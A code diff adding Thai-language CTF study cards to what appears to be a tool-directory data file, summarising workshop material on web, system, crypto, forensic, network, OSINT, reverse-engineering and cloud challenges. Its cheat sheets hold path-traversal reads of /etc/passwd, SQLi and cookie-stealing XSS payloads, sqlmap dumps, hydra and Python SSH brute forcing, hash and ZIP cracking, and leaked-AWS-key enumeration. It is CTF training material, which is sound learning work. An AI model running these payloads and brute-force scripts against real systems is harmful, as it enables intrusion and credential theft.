+about:'การ์ดนี้คือเนื้อหาจาก PDF กลุ่ม field guide/workshop ที่ควรรู้ก่อนเริ่มแข่ง: หมวด CTF หลัก, รูปแบบ flag, วิธีเตรียม lab, playbook การแก้โจทย์, การอ่าน clue, การไม่เสียเวลาผิดจุด และการเชื่อมเครื่องมือหลายหมวดเข้าด้วยกัน ไม่ใช่การคัดลอกสไลด์ทั้งเล่ม แต่สรุปเป็น guideline ใช้งานจริงในสนาม',
+usage:[{label:'CTF solving loop from PDFs',body:`# 1. Read
+อ่านโจทย์ 2 รอบ: ไฟล์ที่ให้มา, service URL/IP, hint, flag format, category
+
+# 2. Identify
+file *
+strings -a challenge 2>/dev/null | head
+exiftool challenge 2>/dev/null
+binwalk challenge 2>/dev/null
+
+# 3. Choose lane
+Web      -> Burp/curl/dirsearch/sqlmap/manual payload
+Forensic -> file/xxd/strings/binwalk/exiftool/volatility
+Crypto   -> CyberChef/dCode/OpenSSL/RsaCtfTool/Sage
+Pwn      -> file/checksec/gdb/pwntools
+Reverse  -> strings/Ghidra/jadx/uncompyle/dnSpy
+OSINT    -> Google/GitHub/Wayback/EXIF/geolocation
+
+# 4. Iterate
+ตั้งสมมติฐาน -> รันเครื่องมือเล็กๆ -> อ่าน output -> จด evidence -> เปลี่ยนทางเมื่อไม่คืบ
+
+# 5. Validate
+หา flag format เช่น flag{...}, picoCTF{...}, CTF{...}
+อย่าส่งคำตอบจนแน่ใจว่าไม่มี newline/space เกิน`},
+{label:'Common mistakes from training slides',body:`# สิ่งที่เสียเวลาบ่อย
+- เชื่อ extension โดยไม่ดู magic bytes
+- brute force ก่อนเข้าใจ baseline
+- ใช้ tool ใหญ่โดยไม่อ่าน output พื้นฐาน
+- ไม่จด command ที่ใช้ ทำให้ย้อนรอยไม่ได้
+- ลืม strings แบบ UTF-16LE ใน Windows/memory challenge
+- มองหา flag ตรงๆ อย่างเดียว ไม่ดู metadata/log/history
+- ไม่ทำ copy ก่อนซ่อมไฟล์เสีย
+- ใช้ exploit โดยไม่อ่าน requirement/version/path
+- มองข้าม source code/comment/robots.txt/.git
+- ไม่แยก local test กับ remote exploit script`},
+{label:'Flag search cheatsheet',body:`# grep common flag patterns in files
+grep -RaoEi "flag\\{[^}]+\\}|picoCTF\\{[^}]+\\}|CTF\\{[^}]+\\}" . 2>/dev/null
+
+# binary files
+find . -type f -exec strings -a {} \\; | grep -aiE "flag|pico|ctf|secret|password"
+find . -type f -exec strings -a -el {} \\; | grep -aiE "flag|pico|ctf|secret|password"
+
+# archives recursively
+7z x challenge.zip -oout
+grep -RaiE "flag|pico|ctf|secret|password" out
+
+# web responses
+curl -s "$URL" | grep -aiE "flag|pico|ctf|secret|password|admin|debug"`}],
+tips:['PDF กลุ่ม workshop เน้น mindset มากกว่า tool: อ่านโจทย์, identify, เลือกทาง, validate','อย่าข้ามขั้น file/strings/metadata เพราะหลาย flag อยู่ตรงนั้น','ทุก category มี pattern ซ้ำ: enumerate ก่อน exploit','เก็บ notes ระหว่างทำ เพราะ CTF หลายข้อเฉลยจาก clue ที่เคยเห็นแล้ว','ถ้าติด 15-20 นาที ให้กลับไปอ่านโจทย์และดูไฟล์ด้วยเครื่องมือพื้นฐานใหม่'],
+checklistTitle:'PDF methodology checklist',
+checklist:['อ่านโจทย์และ flag format','สร้าง working directory และ copy ไฟล์','รัน identify tools พื้นฐาน','เลือก lane ตาม evidence ไม่ใช่เดา','ใช้เครื่องมือเล็กก่อนเครื่องมือหนัก','จด command/output สำคัญ','หา flag ทั้ง ASCII และ UTF-16LE','ตรวจ metadata/history/logs','validate flag ก่อน submit','สรุปวิธีทำไว้เป็น writeup สั้นๆ'],
+},
+
+{cat:'ctf2025',name:'PDF Notes — Web Exploitations & OWASP',tags:['cli','online'],
+desc:'สรุป Chapter05-Web Exploitations + CTF_Workshop_v2: source inspection, cookies, HTTP, traversal, SQLi, XSS, Burp',
+about:'เนื้อหาจาก PDF Web Exploitations และ OWASP workshop ถูกสรุปเป็นลำดับทำโจทย์ Web: inspect source, HTML/CSS/JS, cookies/session, HTTP methods, path traversal, directory discovery, Burp interception, SQL Injection, XSS, SSRF, JWT และ security misconfiguration',
+usage:[{label:'PDF web inspection flow',body:`# Source inspection
+curl -s "$URL" | tee index.html
+grep -niE "flag|secret|admin|debug|todo|api|token" index.html
+
+# HTML/CSS/JS
+curl -s "$URL/app.js" | tee app.js
+grep -niE "api|admin|flag|token|secret|endpoint|debug" app.js
+python3 -m json.tool data.json
+
+# cookies
+curl -i "$URL/login"
+curl -i "$URL/admin" -H "Cookie: session=..."
+
+# HTTP methods
+curl -i -X OPTIONS "$URL/"
+curl -i -X TRACE "$URL/"
+curl -i -X PUT "$URL/uploads/test.txt" --data "test"
+curl -i -X DELETE "$URL/item/1"`},
+{label:'Path traversal and file read from PDF topics',body:`# classic traversal
+curl "$URL/download?file=../../../../etc/passwd"
+curl "$URL/download?path=..%2f..%2f..%2f..%2fetc%2fpasswd"
+
+# Windows
+curl "$URL/download?file=..\\..\\..\\..\\Windows\\win.ini"
+
+# PHP filters
+curl "$URL/index.php?page=php://filter/convert.base64-encode/resource=index.php"
+
+# useful Linux targets
+/etc/passwd
+/etc/hosts
+/proc/self/environ
+/proc/self/cmdline
+/var/log/apache2/access.log
+/var/www/html/index.php
+/flag.txt`},
+{label:'SQLi and XSS patterns from workshop',body:`# SQLi probes
+'
+' OR '1'='1'--
+admin'--
+' UNION SELECT NULL--
+' AND SLEEP(5)--
+' AND EXTRACTVALUE(1, CONCAT(0x7e, database()))--
+
+# sqlmap after confirming parameter
+sqlmap -r request.txt --batch --level 5 --risk 3 --dbs
+sqlmap -u "$URL/item?id=1" --batch --dump
+
+# XSS types
+Reflected: payload appears immediately in response
+Stored: payload saved and executed later
+DOM-based: JavaScript reads location/hash/search and writes HTML
+
+# XSS payloads
+<script>alert(1)<\\/script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(document.cookie)>`},
+{label:'OWASP CTF mapping from PDF',body:`A01 Broken Access Control:
+- IDOR: /user/1 -> /user/2
+- role/user_id tampering
+- admin path accessible without check
+
+A02 Crypto Failures:
+- weak JWT secret
+- alg=none
+- sensitive data over HTTP
+- reversible encoding mistaken as encryption
+
+A03 Injection:
+- SQLi, command injection, SSTI, LDAP/NoSQL style payloads
+
+A04 Insecure Design:
+- logic bypass, missing server-side check, predictable reset token
+
+A05 Security Misconfiguration:
+- debug mode, default creds, exposed .git/.env/backup, verbose errors
+
+A08 Software/Data Integrity:
+- unsigned upload/update/plugin/package, deserialization, dependency confusion style clues`}],
+tips:['PDF Web บทต้นเน้น source inspection เพราะ CTF ชอบซ่อน clue ใน comment/JS/CSS','อย่าใช้ sqlmap ก่อนรู้ว่า parameter มีพฤติกรรมเปลี่ยนจริง','HTTP method แปลกอย่าง PUT/TRACE/OPTIONS เจอในโจทย์ misconfig ได้','Cookie/JWT ต้อง decode และลองแก้ role/admin/is_admin','Path traversal ต้องลองทั้ง Linux, Windows, URL encoding, double encoding'],
+checklistTitle:'PDF web checklist',
+checklist:['view-source และ grep comment/JS/CSS','เก็บ request สำคัญใน Burp','เช็ค cookies/session/JWT','ลอง HTTP methods และ headers','directory discovery ด้วย dirsearch/gobuster','parameter discovery ด้วย Arjun','ทดสอบ IDOR/access control','ทดสอบ traversal/LFI/RFI','ทดสอบ SQLi/XSS/SSTI/command injection','ค้น exposed .git/.env/backup/debug'],
+},
+
+{cat:'ctf2025',name:'PDF Notes — System Exploitation',tags:['cli'],
+desc:'สรุป Chapter04-System Exploitations: pentest stages, recon, scanning, gaining access, privesc, reporting',
+about:'Chapter04 สรุปภาพ system exploitation ตั้งแต่แนวคิด vulnerability, ตัวอย่าง CVE สำคัญ, stage ของ penetration testing, OSINT/recon, scanning, gaining access, maintaining access, covering tracks และ reporting ใน WEB2 สรุปเป็น workflow ที่ใช้กับ CTF machine ได้ทันที',
+usage:[{label:'Pentest stages converted to CTF workflow',body:`# Stage 1 Reconnaissance
+whois target.com
+dig target.com
+subfinder -d target.com
+shodan host 1.2.3.4
+
+# Stage 2 Scanning
+nmap -Pn -n --open -T4 --top-ports 1000 $TARGET
+nmap -Pn -p- --min-rate 5000 $TARGET
+nmap -Pn -sCV -p $PORTS $TARGET
+
+# Stage 3 Gaining Access
+searchsploit service version
+msfconsole
+hydra -L users.txt -P pass.txt ssh://$TARGET
+
+# Stage 4 Privilege Escalation
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+linpeas.sh
+winPEASx64.exe
+
+# Stage 5 Reporting for CTF
+จด IP, port, vuln, payload, creds, path to user flag/root flag`},
+{label:'CVE mindset from PDF examples',body:`# PDF ยกตัวอย่างช่องโหว่ดังระดับระบบ เช่น:
+Buffer overrun, Heartbleed, Shellshock, Spectre/Meltdown,
+EternalBlue, Struts2, BlueKeep, Zerologon, Log4Shell, Outlook privesc
+
+# วิธีใช้ใน CTF:
+1. fingerprint service/version ให้ชัด
+2. searchsploit/CVE/HackTricks
+3. อ่าน exploit requirement
+4. ทดสอบใน local/container ถ้าทำได้
+5. ปรับ RHOST/RPORT/path/callback
+6. เก็บ shell แล้ว enumerate ต่อ`},
+{label:'Architecture and service artifact survey',body:`# Web/service artifacts
+curl -i $URL
+whatweb $URL
+nikto -h $URL
+nmap --script http-title,http-headers,http-enum -p80,443 $TARGET
+
+# Host artifacts
+hostname
+uname -a
+cat /etc/os-release
+systeminfo
+ip addr
+netstat -tulpn
+
+# Public info search engines from methodology
+Google dorks
+Shodan
+BuiltWith
+PublicWWW
+OSINT.sh style aggregators`}],
+tips:['Chapter04 เน้นว่า exploit ต้องเริ่มจาก recon/scanning ที่แม่น ไม่ใช่สุ่ม payload','CVE ชื่อดังใน PDF ใช้เป็น mental model: version + condition + exploit path','ใน CTF ไม่ต้อง cover tracks จริง แต่ต้องรู้ว่า log/artifact อยู่ไหนเพื่อ forensic/reverse clue','Reporting แบบสั้นช่วยให้ย้อน exploit chain ได้เมื่อหลุด shell'],
+checklistTitle:'PDF system checklist',
+checklist:['ระบุ target และ scope','Nmap fast/full/service/UDP','fingerprint web/service/version','ค้น exploit ด้วย searchsploit/CVE/HackTricks','อ่าน exploit code ก่อนรัน','ได้ shell แล้ว upgrade TTY','enumerate OS/user/network/files','privesc ด้วย sudo/SUID/capability/service/cron','เก็บ credentials reuse','จด path to flag'],
+},
+
+{cat:'ctf2025',name:'PDF Notes — Programming for Ethical Hacking',tags:['python','cli'],
+desc:'สรุป Chapter03: automation, brute force, threading, SSH brute, ZIP/hash cracking, algorithms, sockets',
+about:'Chapter03 เน้นการเขียนโปรแกรมเพื่อช่วยแฮ็กและแก้ CTF: brute force, automation, multithreading, SSH brute force, ZIP cracking, hash cracking, parsing files, prime/palindrome/Fibonacci/matrix algorithms และ socket programming การ์ดนี้แปลงเป็น template ที่เอาไปใช้ในสนามได้',
+usage:[{label:'Brute force and automation patterns',body:`# PIN brute force
+from itertools import product
+for pin in product("0123456789", repeat=4):
+    candidate = ''.join(pin)
+    # send candidate to local function or remote service
+
+# range split for threading
+def brute_force(start, end):
+    for i in range(start, end):
+        pass
+
+# file wordlist loop
+with open("wordlist.txt", errors="ignore") as f:
+    for line in f:
+        word = line.strip()
+        if not word:
+            continue`},
+{label:'SSH / ZIP / hash cracking scripts',body:`# SSH brute force idea
+import paramiko
+def try_ssh(host, username, password):
+    c = paramiko.SSHClient()
+    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        c.connect(host, username=username, password=password, timeout=3)
+        return True
+    except Exception:
+        return False
+
+# ZIP cracking idea
+import zipfile
+with zipfile.ZipFile("protected.zip") as zf:
+    for pw in open("rockyou.txt", errors="ignore"):
+        try:
+            zf.extractall(pwd=pw.strip().encode())
+            print("FOUND", pw)
+            break
+        except Exception:
+            pass
+
+# Hash cracking idea
+import hashlib
+target = "5f4dcc3b5aa765d61d8327deb882cf99"
+for w in open("rockyou.txt", errors="ignore"):
+    if hashlib.md5(w.strip().encode()).hexdigest() == target:
+        print(w)`},
+{label:'Algorithm snippets from PDF topics',body:`# prime
+def is_prime(n):
+    if n < 2: return False
+    i = 2
+    while i * i <= n:
+        if n % i == 0: return False
+        i += 1
+    return True
+
+# palindrome
+def is_palindrome(s):
+    return s == s[::-1]
+
+# Fibonacci
+def fibo(n):
+    a,b = 0,1
+    for _ in range(n):
+        a,b = b,a+b
+    return a
+
+# matrix multiply
+def matmul(A,B):
+    return [[sum(A[i][k]*B[k][j] for k in range(len(B)))
+             for j in range(len(B[0]))] for i in range(len(A))]`},
+{label:'Socket programming bridge to CTF',body:`from pwn import *
+import re
+
+p = remote("host", 1337)
+while True:
+    line = p.recvline(timeout=3)
+    if not line:
+        break
+    print(line)
+    nums = list(map(int, re.findall(rb"-?\\d+", line)))
+    if nums:
+        p.sendline(str(sum(nums)).encode())
+    if b"flag" in line.lower():
+        break
+p.interactive()`}],
+tips:['Programming PDF เน้นเขียน script ช่วยลดงานซ้ำ ไม่ใช่ทำมือใน terminal','Brute force ต้องมี early stop และ timeout','Threading ใช้เมื่อ network/service ช้า แต่ระวัง rate limit','hash/zip cracking ทำเองได้เพื่อเข้าใจ แต่ในสนามใช้ john/hashcat เมื่อ format รองรับ','algorithm snippets ช่วย misc/programming และ crypto เบื้องต้น'],
+checklistTitle:'PDF programming checklist',
+checklist:['เขียน parser input ให้ถูกก่อน','ทำ solve script rerun ได้','ใช้ itertools/product สำหรับ brute force','ใช้ timeout/error handling กับ network','ใช้ threading เฉพาะจำเป็น','ใช้ regex หาเลข/flag/token','เก็บ output ลงไฟล์เมื่อยาว','เทียบคำตอบกับ sample','เปลี่ยนจาก prototype เป็น final script','อย่าลืม edge cases'],
+},
+
+{cat:'ctf2025',name:'PDF Notes — Cryptography Course',tags:['python','online','cli'],
+desc:'สรุป Chapter06 + forensic crypto: CyberChef, dCode, OpenSSL, encodings, Morse, RSA small-e',
+about:'Chapter06 มีพื้นฐาน cryptography และเครื่องมือ CyberChef, dCode.fr, OpenSSL รวมถึง encoding หลายฐาน เช่น binary, octal, hex, base32, base45, base58, base62, base64, base85, ASCII, UTF-8, Morse และแนว RSA จาก CTF_Forensic_v1 เช่น small e attack การ์ดนี้จัดเป็นขั้นตอน decode/attack',
+usage:[{label:'Encoding ladder from PDF',body:`# Try in this order when ciphertext looks encoded
+Binary   -> groups of 8 bits: 01000001
+Octal    -> digits 0-7, often 3 digits per char
+Hex      -> 0-9a-f, even length
+Base32   -> A-Z2-7 with = padding
+Base45   -> QR/alphanumeric charset
+Base58   -> Bitcoin-like, no 0 O I l
+Base62   -> 0-9A-Za-z
+Base64   -> A-Z a-z 0-9 + / =
+Base85   -> dense ASCII, often starts/ends with special markers
+ASCII    -> decimal codes like 65 66 67
+UTF-8    -> multibyte text
+Morse    -> dots/dashes separated by spaces/slashes
+
+# CyberChef recipe:
+Magic -> From Base64 -> From Hex -> XOR Brute Force -> ROT13 -> Decode Text`},
+{label:'Python decoders matching PDF examples',body:`import base64, binascii
+
+s = b"SGVsbG8="
+for name, fn in [
+    ("b64", base64.b64decode),
+    ("b32", base64.b32decode),
+    ("b85", base64.b85decode),
+]:
+    try:
+        print(name, fn(s))
+    except Exception:
+        pass
+
+# hex
+print(bytes.fromhex("666c6167"))
+
+# decimal ASCII
+nums = "102 108 97 103".split()
+print(bytes(map(int, nums)))`},
+{label:'OpenSSL from PDF tool section',body:`# hash
+openssl dgst -md5 file
+openssl dgst -sha256 file
+
+# AES decrypt examples
+openssl enc -d -aes-256-cbc -in enc.bin -out dec.bin -k password
+openssl enc -d -aes-128-ecb -in enc.bin -out dec.bin -K HEXKEY
+
+# RSA/key/cert
+openssl rsa -in private.pem -text -noout
+openssl x509 -in cert.pem -text -noout
+openssl pkeyutl -decrypt -inkey private.pem -in cipher.bin -out plain.bin`},
+{label:'RSA small e note from CTF_Forensic_v1',body:`# If e=3 and plaintext^3 < n, ciphertext is exact cube
+from gmpy2 import iroot
+from Crypto.Util.number import long_to_bytes
+
+c = 123456
+m, exact = iroot(c, 3)
+if exact:
+    print(long_to_bytes(int(m)))
+
+# Use RsaCtfTool for automated checks
+python3 RsaCtfTool.py -n N -e 3 --uncipher C
+
+# Always collect:
+n, e, c, p, q, d, phi, dp, dq, qinv, public/private key files`}],
+tips:['PDF Crypto เรียง encoding หลายฐานไว้ดี ใช้เป็น decode ladder ได้','CyberChef/dCode เหมาะกับ identify และ classical cipher','OpenSSL เหมาะกับไฟล์จริง เช่น cert/key/AES/RSA','RSA small-e ต้องเช็คว่า cube root exact หรือไม่','ถ้า decode แล้วอ่านไม่ออก ให้ลองอีก layer อย่าหยุดที่ binary-looking output'],
+checklistTitle:'PDF crypto checklist',
+checklist:['ดู alphabet/charset/length/padding','ลอง CyberChef Magic','ลอง base/hex/ascii/morse ladder','แยก encoding/hash/encryption','ใช้ dCode กับ classical cipher','ใช้ OpenSSL กับไฟล์ key/cert/AES','รวบรวมค่า RSA ทั้งหมด','ใช้ RsaCtfTool/Sage/FactorDB','เขียน Python เมื่อเป็น custom scheme','ค้น flag หลังทุก decode layer'],
+},
+
+{cat:'ctf2025',name:'PDF Notes — Digital Forensics Course',tags:['cli','python'],
+desc:'สรุป Chapter07 + CTF_Forensic_v1: chain of custody, forensic types, metadata, signatures, CRC, carving, Volatility',
+about:'Chapter07 ให้ภาพรวม digital forensics ตั้งแต่ chain of custody, ประเภท forensic, file/disk/memory/network/cloud/mobile, metadata, file signatures, CRC, carving และ Python helper ส่วน CTF_Forensic_v1 เสริม methodology, signatures, Volatility และ network/crypto integration การ์ดนี้รวมเป็นคู่มือ forensic จาก PDF',
+usage:[{label:'Forensic process and evidence handling',body:`# CTF version of chain of custody
+mkdir case
+cp original.bin case/working.bin
+sha256sum original.bin working.bin | tee hashes.txt
+
+# Work only on copy
+file working.bin
+xxd -g 1 -l 128 working.bin
+strings -a working.bin | head
+exiftool working.bin
+binwalk working.bin
+
+# Keep notes
+echo "offset 1234 contains PNG header" >> notes.txt
+echo "used binwalk -e, found zip" >> notes.txt`},
+{label:'File signatures from PDF slides',body:`PNG  89 50 4E 47 0D 0A 1A 0A
+JPEG FF D8 FF
+PDF  25 50 44 46
+ZIP  50 4B 03 04
+ELF  7F 45 4C 46
+GIF  47 49 46 38
+AVI  RIFF....AVI LIST
+WAV  RIFF....WAVEfmt
+
+# Check manually
+xxd -g 1 -l 32 file
+tail -c 32 file | xxd -g 1
+binwalk file`},
+{label:'Metadata and carving from PDF topics',body:`# metadata
+exiftool image.jpg
+exiftool document.pdf
+pdfinfo document.pdf
+
+# carve embedded/deleted files
+binwalk -e blob.bin
+foremost -i blob.bin -o foremost_out
+scalpel blob.bin -o scalpel_out
+
+# JPEG carve by markers
+grep -abo "$(printf '\\xff\\xd8\\xff')" dump.bin
+grep -abo "$(printf '\\xff\\xd9')" dump.bin
+dd if=dump.bin of=carved.jpg bs=1 skip=START count=SIZE status=none
+
+# PNG CRC problem hint
+pngcheck -v broken.png
+pngfix --out=fixed.png broken.png`},
+{label:'Volatility from PDF forensic part',body:`MEM=memory.raw
+
+# identify and process triage
+vol -f $MEM windows.info
+vol -f $MEM windows.pslist
+vol -f $MEM windows.pstree
+vol -f $MEM windows.cmdline
+
+# flag/file search
+strings -a $MEM | grep -aiE "flag|pico|ctf|password|secret"
+strings -a -el $MEM | grep -aiE "flag|pico|ctf|password|secret"
+vol -f $MEM windows.filescan | grep -aiE "flag|secret|Desktop|Downloads"
+vol -f $MEM -o out windows.dumpfiles --filter ".*flag.*" --ignore-case
+
+# network/registry
+vol -f $MEM windows.netscan
+vol -f $MEM windows.registry.hivelist
+vol -f $MEM windows.registry.hashdump`}],
+tips:['PDF Forensics เน้น chain of custody แต่ใน CTF แปลเป็น hash original + work on copy','file signature table เป็นจุดเริ่มของการซ่อมไฟล์เสีย','Metadata อาจมี author, GPS, software, timestamp, hidden comments','CRC/chunk เสียใน PNG ให้ใช้ pngcheck ก่อนแก้ hex','Memory forensic ต้องเริ่มจาก OS/process/cmdline/filescan'],
+checklistTitle:'PDF forensic checklist',
+checklist:['hash original และทำ working copy','identify file type ด้วย magic','strings ASCII/UTF-16LE','metadata ด้วย exiftool/pdfinfo','binwalk/foremost/scalpel carve','ซ่อม header/footer/CRC เมื่อจำเป็น','disk image ใช้ mmls/fls/icat','memory ใช้ Volatility','network pcap ส่งต่อ Wireshark/tshark','จด offset และหลักฐานทุกขั้น'],
+},
+
+{cat:'ctf2025',name:'PDF Notes — Network Security Mini Course',tags:['cli'],
+desc:'สรุป CTF_Forensic_v1 network: Wireshark, tcpdump, NetworkMiner, tshark, Zeek, SYN scan, HTTP/DNS decode',
+about:'CTF_Forensic_v1 มีส่วน Network Security ที่เน้นสิ่งที่ต้องหาใน CTF, เครื่องมือ Wireshark/tcpdump/NetworkMiner/tshark/Zeek และตัวอย่าง filter เช่น SYN scan การ์ดนี้สรุปเป็น packet-analysis workflow',
+usage:[{label:'Network clues to hunt',body:`# What to look for in CTF pcap
+- credentials in HTTP/FTP/Telnet/SMTP/POP3
+- downloaded/uploaded files
+- DNS subdomain exfiltration
+- TCP stream containing flag
+- port scan/recon
+- suspicious beaconing
+- base64/hex in payload
+- images/archives embedded in traffic`},
+{label:'Wireshark/tshark filters from PDF concepts',body:`# SYN scan indicator
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+
+# HTTP and POST data
+http
+http.request.method == "POST"
+http contains "flag"
+frame contains "password"
+
+# Follow stream
+tcp.stream eq 0
+
+# tshark equivalents
+tshark -r capture.pcap -Y 'tcp.flags.syn==1 && tcp.flags.ack==0'
+tshark -r capture.pcap -Y http.request -T fields -e http.host -e http.request.uri
+tshark -r capture.pcap -q -z follow,tcp,ascii,0`},
+{label:'Decode/extract workflow',body:`PCAP=capture.pcap
+capinfos $PCAP
+tshark -r $PCAP -q -z io,phs
+tshark -r $PCAP -q -z conv,tcp
+
+# export HTTP files
+mkdir http_out
+tshark -r $PCAP --export-objects http,http_out
+
+# Zeek logs
+zeek -r $PCAP
+cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service
+cat http.log | zeek-cut host uri user_agent
+cat dns.log | zeek-cut query answers
+
+# NetworkMiner GUI:
+# open pcap -> check Hosts, Files, Images, Credentials`}],
+tips:['PDF network section เน้น filter SYN เพื่อมอง scan/recon','Follow TCP stream คือวิธีเร็วที่สุดในการอ่าน protocol text','NetworkMiner เหมาะกับดึงไฟล์และ credential แบบ GUI','Zeek/Brim เหมาะกับ pcap ใหญ่เพราะแตกเป็น log','ถ้า traffic encoded ให้ extract payload แล้วส่งต่อ CyberChef'],
+checklistTitle:'PDF network checklist',
+checklist:['capinfos/protocol hierarchy','conversation top talkers','SYN scan/filter anomalies','HTTP/DNS/FTP/SMTP/Telnet','follow streams','export objects/files','grep flag/password/secret','Zeek logs for timeline','NetworkMiner credentials/files/images','ส่ง extracted files ไป forensics/stego'],
+},
+
+{cat:'ctf2025',name:'PDF Notes — OSINT Investigations',tags:['online','cli'],
+desc:'สรุป Old-Chapter08: search engine, social media, people/phone, reverse image, username, EXIF, geolocation, wireless, archives, crypto',
+about:'Old-Chapter08 OSINT for Investigations แยกหมวด OSINT ชัดเจน: search engine, social media, people search, phone number, reverse image, username, EXIF viewer, geolocation, wireless network mapping, air traffic, marine records, internet archive, AI image clues และ cryptocurrency basics การ์ดนี้ทำเป็น workflow สำหรับ OSINT CTF',
+usage:[{label:'OSINT artifact routing',body:`Domain/URL     -> Google dorks, Wayback, crt.sh, Shodan, BuiltWith
+Username       -> Sherlock, Maigret, WhatsMyName, Namechk
+Email          -> Holehe, Epieos, breach hints, GitHub search
+Phone          -> phone lookup, country code, messaging/social clues
+Image          -> reverse image, EXIF, geolocation, OCR, visual clues
+GPS/Place      -> Google Maps, Geohints, What3Words, Pic2map
+Wi-Fi SSID/BSSID -> Wigle
+Crypto address -> Etherscan/block explorer
+Archive clue   -> Wayback Machine / internet archives`},
+{label:'Search engine and GitHub dorks',body:`# Google
+"exact phrase from challenge"
+site:target.com filetype:pdf
+site:target.com "flag"
+site:github.com "target.com" "password"
+intitle:"index of" "backup"
+
+# GitHub
+"api_key" "target"
+"SECRET_KEY" filename:.env
+"flag{" language:Python
+
+# Wayback
+waybackurls target.com | tee wayback.txt
+grep -iE "admin|backup|api|flag|token|secret" wayback.txt`},
+{label:'Image/geolocation/wireless',body:`# EXIF/GPS
+exiftool image.jpg
+exiftool -gpslatitude -gpslongitude image.jpg
+
+# Reverse image
+# Google Lens, Yandex, TinEye, Bing Visual Search
+
+# Geolocation
+# Geohints: road signs, bollards, poles, license plates, lane markings
+# Pic2map: EXIF GPS map
+# What3Words: 3-word address to map
+
+# Wireless
+# Wigle: search SSID/BSSID from screenshot/pcap/router label`}],
+tips:['OSINT PDF แยก artifact ชัด ให้เลือกเครื่องมือตามสิ่งที่โจทย์ให้มา','Exact phrase สำคัญมาก ค้นทั้ง Google/GitHub/Wayback','Reverse image ควร crop เฉพาะวัตถุ/ป้าย/อาคารแล้วค้นซ้ำ','EXIF ไม่มีไม่ได้แปลว่าไม่มี geo clue ดูภาพด้วยตา','Crypto OSINT ใช้ block explorer ดู tx/event/source/storage'],
+checklistTitle:'PDF OSINT checklist',
+checklist:['ระบุ artifact: username/email/domain/image/location/crypto','ค้น exact phrase','ใช้ Google/GitHub dorks','ดู Wayback/archive','username ผ่าน Sherlock/Namechk/WhatsMyName','image ผ่าน EXIF + reverse image','geo ผ่าน Geohints/Pic2map/What3Words','Wi-Fi ผ่าน Wigle','crypto ผ่าน Etherscan/explorer','จด source URL ที่พิสูจน์ flag'],
+},
+
+{cat:'ctf2025',name:'PDF Notes — Reverse Engineering, Pwnage, APK & Cloud',tags:['cli','python','java'],
+desc:'สรุป Old-Chapter09 + ctf_security: C/C++ reverse, Python/Java/.NET reverse, APK=ZIP, AES ECB/CBC, API intercept, AWS key leak',
+about:'Old-Chapter09 สรุป reverse engineering และ pwnage ใน C/C++, Python, Java, .NET และ system compromise ส่วน ctf_security.pdf เพิ่ม field guide ด้าน APK/mobile, cloud/AWS key leak, API interception และ crypto mode อย่าง ECB/CBC การ์ดนี้รวมเนื้อหา PDF กลุ่มนี้เป็น playbook',
+usage:[{label:'Reverse/Pwn routing from PDF',body:`Native C/C++ binary:
+file/checksec/strings/readelf/objdump/Ghidra/IDA/GDB/pwndbg
+
+Python:
+pyinstxtractor -> pyc -> uncompyle6/pycdc/PyLingual -> dis
+
+Java:
+jar tf -> javap -c -p -> JD-GUI/CFR/Bytecode Viewer
+
+.NET:
+ILSpy/dnSpy -> search strings -> patch/debug IL
+
+Android APK:
+APK = ZIP -> apktool/jadx -> Manifest/strings/assets/smali -> adb/logcat
+
+Pwn:
+crash -> cyclic offset -> ret2win/ROP/ret2libc/fmtstr -> pwntools remote`},
+{label:'APK field guide from ctf_security',body:`# APK = ZIP
+unzip app.apk -d apk_zip
+apktool d app.apk -o apk_out
+jadx -d jadx_out app.apk
+
+# what to inspect
+AndroidManifest.xml
+res/values/strings.xml
+assets/
+res/raw/
+smali/
+classes.dex
+
+# common CTF routes
+- hardcoded key/flag in strings/assets
+- PIN check in Java/Kotlin/smali
+- encrypted flag decrypted after correct PIN
+- API endpoint hidden in app.js/source
+- exported activity/deeplink bypass
+- logcat leaks`},
+{label:'AES/API/cloud notes from ctf_security',body:`# AES mode clue
+ECB: repeated plaintext blocks create repeated ciphertext blocks, no IV
+CBC: needs IV and key, first block depends on IV
+
+# OpenSSL test
+openssl enc -d -aes-128-ecb -in enc.bin -out dec.bin -K HEXKEY
+openssl enc -d -aes-128-cbc -in enc.bin -out dec.bin -K HEXKEY -iv HEXIV
+
+# API intercept
+adb logcat | grep -iE "http|api|token|flag|secret"
+Burp proxy for emulator/device
+frida/objection if pinning blocks traffic
+
+# AWS key leak CTF flow
+aws configure --profile ctf
+aws sts get-caller-identity --profile ctf
+aws s3 ls --profile ctf
+aws iam list-attached-user-policies --user-name USER --profile ctf
+aws secretsmanager list-secrets --profile ctf`}],
+tips:['PDF reverse/pwn content ชี้ว่าเลือก tool ตาม runtime ก่อน ไม่ใช่เปิดทุก tool พร้อมกัน','APK ต้องจำว่าเป็น ZIP: unzip/strings ก่อนก็เจอ flag ได้บ่อย','PIN challenge มี 2 ทาง: reverse check หรือ patch branch','ECB/CBC clue จาก PDF ช่วยเลือก OpenSSL command ถูก','Cloud CTF เริ่มจาก get-caller-identity แล้ว enumerate permission ตามสิทธิ์ที่มี'],
+checklistTitle:'PDF reverse/mobile/cloud checklist',
+checklist:['ระบุ runtime/format ก่อน','strings และ resource search','ใช้ decompiler ที่ตรงภาษา','หา check/compare/decrypt function','ทำ dynamic debug หรือ patch เมื่อจำเป็น','APK inspect Manifest/strings/assets/smali','ดัก API/logcat/proxy','crypto mode เลือก key/IV/ECB/CBC ให้ถูก','AWS leaked key ใช้ sts get-caller-identity','จด exploit/decrypt path ถึง flag'],
+},
 
 /* ═══════════ TRAINING ═══════════ */
 {cat:'training',name:'picoCTF',url:'https://picoctf.org/',tags:['online'],
